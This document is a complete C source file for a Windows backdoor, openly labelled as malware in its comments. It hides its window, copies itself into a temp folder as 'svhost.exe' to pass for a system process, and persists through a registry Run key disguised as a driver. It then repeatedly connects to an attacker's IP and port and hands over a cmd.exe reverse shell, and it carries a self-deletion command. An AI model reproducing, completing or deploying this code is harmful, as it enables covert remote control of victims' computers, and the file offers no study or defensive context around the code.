#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
//#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>

#pragma warning(disable:4996)
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")
#pragma warning(disable:4996)
#define SELF_REMOVE_STRING \
    L"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\""

char IP[20], port[20];
STARTUPINFOA sui;
PROCESS_INFORMATION pi;
static wchar_t desireDirPath[MAX_PATH];
static wchar_t malwareNamePath[MAX_PATH];  // malware file's name and path

bool CheckFirstRun();
void Self_Delete();
void GetDir();
void AutoCopy();
void AutoRun();
DWORD WINAPI OpenBackDoor(LPVOID lpParam);

int main(int argc, char* argv[]) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    if (argc < 3) {
        return 0;
    }

    strcpy_s(IP, argv[1]);
    strcpy_s(port, argv[2]);

    // main execute
     if (CheckFirstRun()) {
         GetDir();
         AutoCopy();
         AutoRun();
     }
    
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, OpenBackDoor, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}

//int main(int argc, char* argv[]) {
//    strcpy_s(IP, "172.16.208.223");
//    strcpy_s(port, "49053");
//    HANDLE hThread;
//    hThread = CreateThread(NULL, 0, OpenBackDoor, NULL, 0, NULL);
//    WaitForSingleObject(hThread, INFINITE);
//    CloseHandle(hThread);
//    return 0;
//}

DWORD WINAPI OpenBackDoor(LPVOID lpParam) {
    WSADATA wsa_Data;
    SOCKET wSock = INVALID_SOCKET;
    char cmdLine[] = "cmd.exe";
    int connect_status = 0;
    int iResult;
    struct addrinfo *result, hints;

    while (1) {
        WSAStartup(MAKEWORD(2, 2), &wsa_Data);

        ZeroMemory(&hints, sizeof(addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        iResult = getaddrinfo(IP, port, &hints, &result);

        if (iResult != 0) {
            WSACleanup();
            continue;
        }

        wSock = WSASocketA(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, NULL, NULL);

        connect_status = WSAConnect(wSock, result->ai_addr, result->ai_addrlen, NULL, NULL, NULL, NULL);
        if (connect_status != 0) {
            closesocket(wSock);
            WSACleanup();
            Sleep(4953);
            continue;
        }

        ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        ZeroMemory(&sui, sizeof(STARTUPINFOA));
        sui.cb = sizeof(STARTUPINFOA);
        sui.dwFlags |= STARTF_USESTDHANDLES;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

        CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(wSock);
        WSACleanup();
    }
}

bool CheckFirstRun() {
    wchar_t currFileName[MAX_PATH];
    GetModuleFileNameW(NULL, currFileName, MAX_PATH);
    wchar_t name[] = L"svhost.exe";
    int idx = 0;
    for (size_t i = wcslen(currFileName) - 10; i <= wcslen(currFileName) - 1;
        ++i) {
        if (currFileName[i] != name[idx]) {
            return TRUE;
        }
        idx++;
    }
    return FALSE;
}

void Self_Delete() {
    wchar_t szModuleName[MAX_PATH];
    wchar_t szCmd[2 * MAX_PATH];
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileNameW(NULL, szModuleName, MAX_PATH);

    StringCbPrintfW(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL,
        &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void GetDir() {
    GetTempPathW(MAX_PATH, desireDirPath);
    wcscat_s(desireDirPath, L"WPDNSE");
}

void AutoCopy() {
    CreateDirectoryW(desireDirPath, NULL);  // Create malware folder
    wchar_t fileNamePath[MAX_PATH];         // current file's name and path
    GetModuleFileNameW(NULL, fileNamePath, MAX_PATH);
    swprintf_s(malwareNamePath, MAX_PATH, L"%s\\svhost.exe", desireDirPath);
    CopyFileW(fileNamePath, malwareNamePath, FALSE);
}

void AutoRun() {
    char Driver[MAX_PATH];
    sprintf_s(Driver, "%S %s %s", malwareNamePath, IP, port);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
        KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ,
        (const unsigned char*)Driver, MAX_PATH);
    RegCloseKey(hKey);
}

